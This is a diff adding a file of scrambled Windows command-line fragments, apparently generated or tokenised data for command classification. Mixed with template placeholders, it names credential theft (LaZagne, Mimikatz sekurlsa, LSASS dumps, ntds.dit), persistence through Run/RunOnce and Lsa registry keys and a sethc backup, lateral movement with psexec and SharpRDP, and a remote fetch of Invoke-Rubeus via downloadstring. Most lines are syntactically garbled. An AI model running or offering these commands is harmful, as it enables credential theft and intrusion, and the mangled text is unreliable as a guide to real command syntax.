@@ -1,0 +1,64 @@
+namp -sn $ { domain } /o $ { binary_path } ''
+reg add hklm\software\microsoft\windows\currentversion\runonce /v 0 /success `` wordlist
+for ( '' `` day '' % windir } menu\programs\startup\t1547.009.lnk '' $ { output_folder }
+lazagne.exe all
+[ myprocess ] : execution :securityprotocol = servicepackmajorversion , 'image /d ) , 'image ) from win32_desktop
+sc -d `` command_file }
+net group `` domain /f
+workfolders /priv
+reg add `` domain -name `` keylog
+binary } | processor ''
+get-ciminstance -classname opmode mode=disable
+psexec foreach-object ( :utf8.getstring 1000 '' : % //raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1 ren $ { wordlist } remote_file
+new-item /set ( hkey_local_machine\system\currentcontrolset\services\ntds : windir % script_web_url } = buildtype -name execution ' ; get-domainpolicy -verbose ''
+net user $ { output_zip } in $ { input_folder_name } $ { command } & hashcat ' }
+[ ( set .\ppid_spoofing.ps1
+sharprdp.exe computername= $ { ip } ''
+mklink % temp % dumptype $ { title } name -l $ i $ { range_end } ) do menu\programs\startup\t1547.009.lnk } /user $ { binary__file_path } '' -lt $ { domain }
+psr.exe /start ueraccount select-object /ru : \users\yingjie\appdata\local\temp\lsass.dmp `` '' root\subscription $ { fuzz. $ { filename_regex } ''
+invoke-mimikatz.exe
+net user w32time
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` 7 /t port '' '' /t `` reg_sz /d 0 /f
+cmdkey /list
+sekurlsa { weak_service_name } '' /t reg_sz /d { dll_file_path }
+openconsole.exe $ { clsid }
+reg delete $ { nt\currentversion\image file ntds.dit }
+reg delete $ { user_name } $ { username } -t $ { path } /add $ { binary }
+reg add `` hklm\system\currentcontrolset\control\lsa\ '' /v `` autodialdll '' -name `` 1 '' /t reg_sz /d `` `` `` url } executable_binary }
+namp -sn $ { timeout } -o $ { user_name } & & ftp : $ { exit }
+tree
+python make_image.py $ { domain }
+move $ { output_image_path } /o $ { password }
+ipconfig
+set assoc $ { ! }
+7z save myprocess .downloadstring /set ostype c _.status pnpclass , [ net.securityprotocoltype ] : ) .downloadstring ( \windows\system32\sethc_backup.exe
+put $ { target_ip -enabled $ { file_name } /domain
+c : \windows\system32\desk.cpl , ostype ' % f
+sc.exe start spooler
+cmdkey /list
+reg add `` hklm\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe file '' /v impersonate /d `` userinitmprlogonscript /f
+vsiisexelauncher.exe -p $ { password }
+net start = $ { url }
+runexehelper.exe $ { binary_file_path } | -eq system name ' } , $ { binary_file } ''
+import-module .\screencap.ps1
+net group `` username } /domain
+netstat
+get-aduser windows -lsa
+echo { input_folder_name }
+net $ env : /domain $ { target flag to output_file }
+hack-browser-data-windows-64bit.exe
+reg set-itemproperty [ hklm\systyem $ { ip_address } binpath= '' /add } /add `` $ { packet } ;
+del $ { weak_service_name : `` $ { binary } '' /domain
+.\redirect.sdb /domain_trusts
+curl -path `` hklm : $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ) ;
+`` sekurlsa : :credman } null
+reg add `` new-object setup\installed hklm\system\currentcontrolset\control\lsa\ '' /v monitorprocess /d -asplaintext 1
+whois $ { bits_job_name } $ { binary_path }
+pktmon.exe start -- etw
+net user $ { ip } \appdata\local\temp\lsass.dmp
+netstat
+nmap '' $ { time } /interactive find add : stubpath
+wafw00f $ { command } &
+bitsadmin.exe /setnotifycmdline $ { ip } -t $ { password } /add
+import-module .\screencap.ps1
+get-localgroupmember /y
